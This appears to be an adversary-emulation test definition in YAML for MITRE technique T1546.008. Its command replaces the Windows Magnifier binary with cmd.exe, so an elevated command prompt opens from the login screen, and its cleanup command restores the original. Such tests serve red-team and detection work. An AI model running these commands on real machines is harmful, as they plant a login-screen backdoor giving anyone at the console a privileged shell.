- requirements: []
  name: Soumaia ART Tests - Replace Magnify.exe (Magnifier binary) with cmd.exe
  description: Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen. (requires elevation)
  tactic: privilege-escalation
  technique_id: T1546.008
  technique_name: 'Event Triggered Execution: Accessibility Features'
  executors:
  - cleanup:
    - copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\Magnify.exe /A & icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
  id: 6bb70500-9323-5770-8f82-7fb9781a54ef
